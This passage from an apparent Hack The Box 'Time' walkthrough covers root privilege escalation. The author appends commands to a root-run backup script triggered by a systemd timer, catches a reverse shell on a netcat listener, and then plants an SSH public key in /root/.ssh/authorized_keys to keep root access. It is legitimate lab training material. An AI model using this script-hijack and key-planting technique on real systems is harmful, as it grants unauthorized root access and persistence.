Mon 2020-11-23 00:00:00 UTC 5 days left   Mon 2020-11-16 21:31:19 UTC 6h ago       fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a          snapd.snap-repair.timer      snapd.snap-repair.service
```
Checking to see if the script is being invoked:
```bash
pericles@time:/tmp/.asd$ echo "id > /tmp/.asd/test" >> /usr/bin/timer_backup.sh
pericles@time:/tmp/.asd$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
id > /tmp/.asd/test
```
And the timer details:
```bash
pericles@time:/tmp/.asd$ cat /etc/systemd/system/timer_backup.timer
cat /etc/systemd/system/timer_backup.timer
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target

pericles@time:/tmp/.asd$ cat /etc/systemd/system/timer_backup.service
cat /etc/systemd/system/timer_backup.service
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
```
The reference to web_backup.service at the end there means I'll take a look at that as well.
```bash
pericles@time:/tmp/.asd$ cat /etc/systemd/system/web_backup.service
cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
```
So here we can see the script is indeed getting ran using this timer, and the other timer is being used to ensure this timer remains running.

### 5. Escalate to root
```bash
kali@kali:~$ nc -lvnp 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.10.214 57960
bash: cannot set terminal process group (112413): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# whoami
whoami
root
```
Unfortunately, the shell dies literally immediately after this command. Ideally I'd like a shell that persists for a bit longer. Firstly I attempted to spawn a second reverse shell off from this one, however that one also died. The next thing to try is to add my SSH key to the authorized_keys file using the script.  
Firstly generate a new ssh key, then copy the pub key into the file using the script.
```bash
pericles@time:/tmp$ echo 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SGQPKjAfDQ6s2C41Kke2gzSciECKVrHoVZp2jkLhgmEbEmiP91juhxNPrBTtTCYxCviUPRWe2JVWMStHh/je22eBfBSZkUlMLBvHirJd6tskawrhNQGRaxErEDxz1P9ICedYUgM4vS1CIDKTLuS2smFmmh/F3Hn6Q8VJaK6PXHQvUYGF868RaQdvWx+bSrD5emwOQ/lh8K2EloEmNd5JrXgSKTQF2b9qgcKdiJ5XkPe3t80ga8uSZ63ERjRQ6T6LbntrlMdHH/CLLFcQpkrHtdVkBdp52ltRiy2P96cSvnZFspC2Y38fsuW/jagl6qaM6LvMQgcvplcsKM3HVJSiGoSPOaMWR4wgKREG+RyL3A7EMajmSCc4dCjRGBGJl6bbomdfU5s9Q+sxT4YwI2M2lVQfATWVuQTp8p2vrLHns9Ae5Iz7Inp/6SzPRpL0pKWExlOMuDJxfVqLDrzmfgQlqFGvbZo6dsMZUJjXNtBAXOFdnAL+C5aUj4N2o+xMq00= kali@kali" >> /root/.ssh/authorized_keys' >> /usr/bin/timer_backup.sh
pericles@time:/tmp$ cat /usr/bin/timer_backup.sh
cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SGQPKjAfDQ6s2C41Kke2gzSciECKVrHoVZp2jkLhgmEbEmiP91juhxNPrBTtTCYxCviUPRWe2JVWMStHh/je22eBfBSZkUlMLBvHirJd6tskawrhNQGRaxErEDxz1P9ICedYUgM4vS1CIDKTLuS2smFmmh/F3Hn6Q8VJaK6PXHQvUYGF868RaQdvWx+bSrD5emwOQ/lh8K2EloEmNd5JrXgSKTQF2b9qgcKdiJ5XkPe3t80ga8uSZ63ERjRQ6T6LbntrlMdHH/CLLFcQpkrHtdVkBdp52ltRiy2P96cSvnZFspC2Y38fsuW/jagl6qaM6LvMQgcvplcsKM3HVJSiGoSPOaMWR4wgKREG+RyL3A7EMajmSCc4dCjRGBGJl6bbomdfU5s9Q+sxT4YwI2M2lVQfATWVuQTp8p2vrLHns9Ae5Iz7Inp/6SzPRpL0pKWExlOMuDJxfVqLDrzmfgQlqFGvbZo6dsMZUJjXNtBAXOFdnAL+C5aUj4N2o+xMq00= kali@kali" >> /root/.ssh/authorized_keys
```
Wait a minute, then try to log in.
```bash
kali@kali:~/Desktop/htb/time$ ssh -i key root@10.10.10.214
The authenticity of host '10.10.10.214 (10.10.10.214)' can't be established.
ECDSA key fingerprint is SHA256:sMBq2ECkw0OgfWnm+CdzEgN36He1XtCyD76MEhD/EKU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.214' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 17 Nov 2020 04:41:09 AM UTC

  System load:             0.0
  Usage of /:              21.8% of 29.40GB
  Memory usage:            34%
  Swap usage:              0%
  Processes:               252
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:259d


83 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Oct 22 17:03:52 2020
root@time:~# whoami
root
```